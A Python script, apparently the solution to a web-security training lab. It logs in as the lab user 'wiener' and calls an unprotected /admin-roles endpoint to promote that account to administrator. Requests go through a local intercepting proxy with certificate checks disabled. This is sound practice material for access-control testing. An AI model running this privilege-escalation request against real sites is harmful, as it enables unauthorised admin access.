import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def promote_to_admin(s, url):
    #login as regular user
    login_url = url + "/login"
    data_login = {"username": "wiener", "password": "peter"}

    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Your username is: wiener" in res:
        print("(+) Successfully Logged in as Wiener")

        #Fetch Session cookie
        # session_cookie = r.cookies.get_dict().get('session')
        # print(session_cookie)
        # cookies = {'session': session_cookie}

        #change user role
        admin_role_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_role_url, verify=False, proxies=proxies)

        if r.status_code == 200 or r.status_code == 302:
            print(r.status_code)
            print("(+) Successfully Promoted Wiener")
        else:
            print("(-) Did not promote wiener to admin.")



    else:
        print("(-) Could not log in as Wiener")
        sys.exit(-1)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    promote_to_admin(s, url)

if __name__ == '__main__':
    main()
